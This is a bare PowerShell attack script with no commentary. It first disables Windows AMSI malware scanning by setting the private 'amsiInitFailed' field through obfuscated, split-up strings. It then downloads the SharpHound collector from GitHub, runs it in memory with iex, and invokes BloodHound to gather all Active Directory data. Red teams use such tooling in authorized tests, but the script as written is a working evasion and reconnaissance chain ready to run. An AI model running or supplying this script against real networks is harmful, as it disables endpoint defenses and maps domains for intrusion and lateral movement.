$w = 'System.Management.Automation.A'
$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'); $field.SetValue($null,$true)
$a = curl -usebasicparsing -URI https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1).content 
iex($a)
Invoke-BloodHound -CollectionMethod All
